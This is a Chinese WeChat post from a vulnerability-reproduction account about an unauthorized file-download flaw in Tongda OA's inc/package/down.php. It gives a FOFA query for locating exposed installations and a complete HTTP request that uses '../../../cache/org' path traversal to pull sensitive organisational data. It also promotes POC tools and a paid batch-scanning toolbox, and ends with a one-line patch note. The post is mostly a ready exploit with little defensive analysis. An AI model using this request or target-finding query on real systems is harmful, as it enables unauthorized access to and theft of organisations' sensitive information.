#  通达OA inc/package/down.php接口存在未授权访问漏洞 附POC   
原创 南风徐来  南风漏洞复现文库   2023-11-28 23:16  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 通达OA接口简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
通达OA（Office Anywhere网络智能办公系统）是由通达信科科技自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。  
## 2.漏洞描述  
  
通达OA（Office Anywhere网络智能办公系统）是由通达信科科技自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。通达OA存在未授权访问漏洞，该漏洞源于系统对用户传入的数据过滤不严。攻击者可借助特制的HTTP请求利用该漏洞访问敏感文件，造成信息泄露。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
通达OA  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYS2nb0PWCtupJ8ED9zrkyWC2Gkic7J1EhIegmIc3cpWLypjI9b2Co8kA/640?wx_fmt=jpeg&from=appmsg "null")  
  
通达OA inc/package/down.php接口存在未授权访问漏洞  
## 4.fofa查询语句  
  
app="TDXK-通达OA"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/inc/package/down.php?id=../../../cache/org  
  
漏洞数据包：  
```
GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYIhzQbpCkyZ5NKQFx5z9gLBoHwepxscQBOXZVBSQWvkVDH0DVxxZGeA/640?wx_fmt=jpeg&from=appmsg "null")  
  
下载文件后，有大量敏感信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYiagYDu8Q6RlkLP4pWLZRHnJpFRYHaZrjhDWkLxayJ2boGtBV03XHh7A/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现83 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYKXSaOezYvHSYfamh6u1IMkXCyVnElUQfbuglV0w90OpEp1ngC0pPdw/640?wx_fmt=jpeg&from=appmsg "null")  
  
**本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYMlCKT1gtYcXTXCZib5NhEbReUUXvJ6coAlPnwHe37sIZd8lUSQeceZg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcYaHR2Tb3vrrXyeE57dXlHUibSUByxib1YBNpibmiatwQWwSuXEfVQaBcBiag/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBM5r7Ta7QRENxnCS0zzcY9ibdibKPUcznFe7s5YrTE6CwNR4FeohSDBYKADFDBS8eHz1eazibOjmlQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：https://www.tongda2000.com/  
## 8.往期回顾  
  
[易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484665&idx=1&sn=b21dce8ba3db849560e2c295f31182ac&chksm=974b89fea03c00e8b28eb9a70c78659ad9d838ee763c942ce63da9d8e98ad4a95b7823c8b4c8&scene=21#wechat_redirect)  
  
  
[用友NC word.docx接口存在任意文件读取漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484647&idx=1&sn=ebb5271c84d60599929e37bb5ab8f939&chksm=974b89e0a03c00f6d967cbcfb28f3a8aef966fb4770867cdf540579262172deeadfeab0d4ccb&scene=21#wechat_redirect)  
  
  
  
  
